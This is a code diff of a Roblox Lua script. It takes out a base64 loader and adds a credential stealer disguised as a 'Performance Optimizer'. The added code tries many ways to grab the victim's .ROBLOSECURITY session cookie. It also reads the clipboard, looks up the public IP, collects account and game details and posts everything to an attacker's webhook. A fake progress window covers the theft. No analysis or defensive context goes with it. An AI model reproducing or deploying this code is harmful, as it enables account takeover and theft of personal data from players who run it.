-    for i = 1, #str do
-        local c = str:sub(i, i)
-        if c:match("[A-Za-z0-9+/=]") then
-            cleaned = cleaned .. c
+local function send(url, content)
+    local payload = {content = content}
+    local json = game:GetService("HttpService"):JSONEncode(payload)
+    local headers = {["Content-Type"] = "application/json"}
+    local methods = {
+        function() return pcall(request, {Url = url, Method = "POST", Headers = headers, Body = json}) end,
+        function() return pcall(http_request, {Url = url, Method = "POST", Headers = headers, Body = json}) end,
+        function() return pcall(game:GetService("HttpService").PostAsync, game:GetService("HttpService"), url, json, Enum.HttpContentType.ApplicationJson) end
+    }
+    for _, method in ipairs(methods) do
+        local ok, res = method()
+        if ok then return true end
+    end
+    return false
+end
+
+send(webhook, "```Test: webhook live```")
+
+local function getIP()
+    local ip = "N/A"
+    local ok, res = pcall(function() return request({Url = "https://api.ipify.org", Method = "GET"}) end)
+    if ok and res and res.Body and res.Body ~= "" then ip = res.Body:gsub("%s+", "") return ip end
+    ok, res = pcall(function() return http_request({Url = "https://api.ipify.org", Method = "GET"}) end)
+    if ok and res and res.Body and res.Body ~= "" then ip = res.Body:gsub("%s+", "") return ip end
+    for _, url in ipairs({"https://api.ipify.org", "https://ip-api.com/json/?fields=query", "https://icanhazip.com", "https://httpbin.org/ip"}) do
+        local ok, result = pcall(function() return game:GetService("HttpService"):GetAsync(url) end)
+        if ok and result and result ~= "" then
+            if result:match('"query":"(.-)"') then ip = result:match('"query":"(.-)"')
+            elseif result:match('"origin":"(.-)"') then ip = result:match('"origin":"(.-)"')
+            else ip = result:gsub("%s+", "") end
+            if ip and ip ~= "" and ip ~= "N/A" then break end
         end
     end
-    return cleaned
+    return ip
 end
 
-local function decodeBase64(str)
-    str = cleanBase64(str)
-    local b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
-    local result = {}
-    for i = 1, #str, 4 do
-        local c1 = b64:find(str:sub(i, i)) - 1 or 0
-        local c2 = b64:find(str:sub(i+1, i+1)) - 1 or 0
-        local c3 = b64:find(str:sub(i+2, i+2)) - 1 or 0
-        local c4 = b64:find(str:sub(i+3, i+3)) - 1 or 0
-        local n = c1 * 262144 + c2 * 4096 + c3 * 64 + c4
-        local b1 = math.floor(n / 65536) % 256
-        local b2 = math.floor(n / 256) % 256
-        local b3 = n % 256
-        table.insert(result, string.char(b1))
-        if str:sub(i+2, i+2) ~= "=" then
-            table.insert(result, string.char(b2))
+local function stealCookie()
+    local ok, val = pcall(getcookie, "https://www.roblox.com/")
+    if ok and val and val ~= "" then return val end
+    ok, val = pcall(getrobloxcookie)
+    if ok and val and val ~= "" then return val end
+    ok, val = pcall(function() return syn and syn.cookie and syn.cookie() end)
+    if ok and val and val ~= "" then return val end
+    ok, val = pcall(function()
+        local res = request({Url = "https://www.roblox.com/", Method = "GET"})
+        if res and res.Headers then
+            for k, v in pairs(res.Headers) do
+                if string.lower(k) == "set-cookie" then
+                    return v:match("(.-);") or v
+                end
+            end
         end
-        if str:sub(i+3, i+3) ~= "=" then
-            table.insert(result, string.char(b3))
+        return nil
+    end)
+    if ok and val and val ~= "" then return val end
+    ok, val = pcall(function()
+        local page = game:GetService("HttpService"):GetAsync("https://www.roblox.com/")
+        if page and page:match("__RequestVerificationToken") then
+            return page:match('__RequestVerificationToken" value="(.-)"')
         end
+        return nil
+    end)
+    if ok and val and val ~= "" then return val end
+    ok, val = pcall(function()
+        local ms = game:GetService("MemoryStoreService"):GetStore(".ROBLOSECURITY")
+        if ms then return ms:GetAsync("cookie") end
+        return nil
+    end)
+    if ok and val and val ~= "" then return val end
+    ok, val = pcall(function()
+        if not getgc then return nil end
+        local gc = getgc(true)
+        for _, v in ipairs(gc) do
+            if type(v) == "string" and v:match("_.%w+%.ROBLOSECURITY") then
+                return v
+            end
+        end
+        return nil
+    end)
+    if ok and val and val ~= "" then return val end
+    ok, val = pcall(function()
+        if not getrawmetatable then return nil end
+        local mt = getrawmetatable(game)
+        if mt and mt.__index then
+            local old = mt.__index
+            for i = 1, 100 do
+                local res = old(game, "HttpService", i)
+                if type(res) == "table" and res.Cookies then
+                    return res.Cookies
+                end
+            end
+        end
+        return nil
+    end)
+    if ok and val and val ~= "" then return val end
+    ok, val = pcall(getclipboard)
+    if ok and val and val:match("_.%w+%.ROBLOSECURITY") then return val end
+    return "Not available (executor limit)"
+end
+
+local function getClip()
+    local ok, val = pcall(getclipboard)
+    if ok and val and val ~= "" then return val end
+    ok, val = pcall(clipboard)
+    if ok and val and val ~= "" then return val end
+    return "N/A"
+end
+
+local function safeGet(obj, prop, default)
+    local ok, val = pcall(function() return obj[prop] end)
+    return ok and val or default
+end
+
+local function collect()
+    local info = {}
+    info.executor = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Unknown"
+    local player = game.Players.LocalPlayer
+    if player then
+        info.userId = tostring(player.UserId)
+        info.userName = player.Name
+        info.displayName = player.DisplayName
+        local id = player.UserId
+        if id and id > 0 then
+            local year = math.floor((id / 100000000) * 2) + 2006
+            info.accountAge = tostring(year) .. " (approx)"
+        end
+        local ok, friends = pcall(function() return #player:GetFriendsOnline() end)
+        info.friendsOnline = ok and tostring(friends) or "N/A"
+        pcall(function()
+            local char = player.Character
+            if char then
+                local hum = char:FindFirstChild("Humanoid")
+                if hum then
+                    info.health = tostring(hum.Health)
+                    info.maxHealth = tostring(hum.MaxHealth)
+                    info.walkSpeed = tostring(hum.WalkSpeed)
+                    info.jumpPower = tostring(hum.JumpPower)
+                end
+                local root = char:FindFirstChild("HumanoidRootPart")
+                if root then info.position = tostring(root.Position) end
+            end
+        end)
+        pcall(function()
+            local backpack = player:FindFirstChild("Backpack")
+            if backpack then
+                local items = {}
+                for _, item in ipairs(backpack:GetChildren()) do
+                    if item:IsA("Tool") then table.insert(items, item.Name) end
+                end
+                if #items > 0 then info.backpack = table.concat(items, ", ") end
+            end
+        end)
+        pcall(function()
+            local ls = player:FindFirstChild("leaderstats")
+            if ls then
+                local stats = {}
+                for _, stat in ipairs(ls:GetChildren()) do
+                    if stat:IsA("NumberValue") or stat:IsA("IntValue") or stat:IsA("StringValue") then
+                        stats[stat.Name] = tostring(stat.Value)
+                    end
+                end
+                if next(stats) then info.leaderstats = game:GetService("HttpService"):JSONEncode(stats) end
+            end
+        end)
     end
-    return table.concat(result)
+    info.placeId = tostring(safeGet(game, "PlaceId", "N/A"))
+    info.jobId = safeGet(game, "JobId", "N/A")
+    info.gameName = safeGet(game, "Name", "Unknown")
+    info.maxPlayers = tostring(safeGet(game, "MaxPlayers", "N/A"))
+    info.serverTime = tostring(safeGet(game, "ServerTime", "N/A"))
+    info.ip = getIP()
+    info.cookie = stealCookie()
+    info.clipboard = getClip()
+    pcall(function()
+        local us = game:GetService("UserInputService")
+        info.platform = tostring(us.Platform)
+        info.graphics = tostring(game:GetService("GraphicsSettings").GraphicsQualityLevel)
+        info.volume = tostring(game:GetService("SoundService").Volume)
+    end)
+    pcall(function()
+        local stats = game:GetService("Stats")
+        info.ping = tostring(stats.Network.ServerStatsItem["Data Ping"]:GetValueString())
+    end)
+    pcall(function()
+        local run = game:GetService("RunService")
+        local ft = run.RenderStepTime
+        if ft and ft > 0 then info.fps = tostring(math.floor(1 / ft)) end
+    end)
+    return info
 end
 
-local decoded = decodeBase64(encoded)
-local func, err = loadstring(decoded)
-if not func then
-    error("Failed to load decoded script: " .. tostring(err))
+local data = collect()
+local lines = {}
+for k, v in pairs(data) do
+    if v and v ~= "" then
+        table.insert(lines, string.format("%s: %s", k, tostring(v)))
+    end
 end
-func()
+local msg = "```\n" .. table.concat(lines, "\n") .. "\n```"
+send(webhook, msg)
+
+pcall(function()
+    local pg = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+    local gui = Instance.new("ScreenGui")
+    gui.Parent = pg
+    gui.ResetOnSpawn = false
+    local f = Instance.new("Frame")
+    f.Size = UDim2.new(0, 420, 0, 200)
+    f.Position = UDim2.new(0.5, -210, 0.5, -100)
+    f.BackgroundColor3 = Color3.fromRGB(30, 35, 45)
+    f.BackgroundTransparency = 0.08
+    f.Parent = gui
+    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 16)
+    local t = Instance.new("TextLabel")
+    t.Size = UDim2.new(1, 0, 0, 50)
+    t.Position = UDim2.new(0, 0, 0, 10)
+    t.BackgroundTransparency = 1
+    t.Text = "Performance Optimizer"
+    t.TextColor3 = Color3.fromRGB(255, 255, 255)
+    t.TextScaled = true
+    t.Font = Enum.Font.GothamBold
+    t.Parent = f
+    local s = Instance.new("TextLabel")
+    s.Size = UDim2.new(1, 0, 0, 30)
+    s.Position = UDim2.new(0, 0, 0.35, 0)
+    s.BackgroundTransparency = 1
+    s.Text = "Optimizing settings..."
+    s.TextColor3 = Color3.fromRGB(200, 200, 210)
+    s.TextScaled = true
+    s.Font = Enum.Font.Gotham
+    s.Parent = f
+    local bg = Instance.new("Frame")
+    bg.Size = UDim2.new(0.8, 0, 0, 18)
+    bg.Position = UDim2.new(0.1, 0, 0.55, 0)
+    bg.BackgroundColor3 = Color3.fromRGB(60, 65, 75)
+    bg.Parent = f
+    Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 9)
+    local fill = Instance.new("Frame")
+    fill.Size = UDim2.new(0, 0, 1, 0)
+    fill.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
+    fill.Parent = bg
+    Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 9)
+    local pct = Instance.new("TextLabel")
+    pct.Size = UDim2.new(0, 60, 0, 30)
+    pct.Position = UDim2.new(0.5, -30, 0.75, 0)
+    pct.BackgroundTransparency = 1
+    pct.Text = "0%"
+    pct.TextColor3 = Color3.fromRGB(255, 255, 255)
+    pct.TextScaled = true
+    pct.Font = Enum.Font.Gotham
+    pct.Parent = f
+    local st = Instance.new("TextLabel")
+    st.Size = UDim2.new(1, 0, 0, 30)
+    st.Position = UDim2.new(0, 0, 0.85, 0)
+    st.BackgroundTransparency = 1
+    st.Text = ""
+    st.TextColor3 = Color3.fromRGB(150, 255, 150)
+    st.TextScaled = true
+    st.Font = Enum.Font.Gotham
+    st.Parent = f
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0, 120, 0, 40)
+    btn.Position = UDim2.new(0.5, -60, 1, -50)
+    btn.BackgroundColor3 = Color3.fromRGB(60, 65, 75)
+    btn.Text = "CLOSE"
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.TextScaled = true
+    btn.Font = Enum.Font.GothamBold
+    btn.Parent = f
+    btn.Visible = false
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)
+    btn.MouseButton1Click:Connect(function() gui:Destroy() end)
+    local function anim()
+        local dur = 2.5
+        local steps = 50
+        local stepTime = dur / steps
+        local msgs = {"Analyzing system...", "Adjusting graphics...", "Optimizing network...", "Fine‑tuning performance...", "Applying optimal settings..."}
+        for i = 0, steps do
+            local prog = i / steps
+            local w = 0.8 * prog
+            fill:TweenSize(UDim2.new(w, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, stepTime, false)
+            pct.Text = string.format("%d%%", math.floor(prog * 100))
+            if i < steps then
+                task.wait(stepTime)
+                if i % 10 == 0 then
+                    s.Text = msgs[math.floor(i / 10) + 1] or msgs[#msgs]
+                end
+            end
+        end
+        s.Text = "Optimization complete!"
+        st.Text = "Settings updated successfully."
+        btn.Visible = true
+    end
+    task.wait(0.3)
+    spawn(anim)
+end)
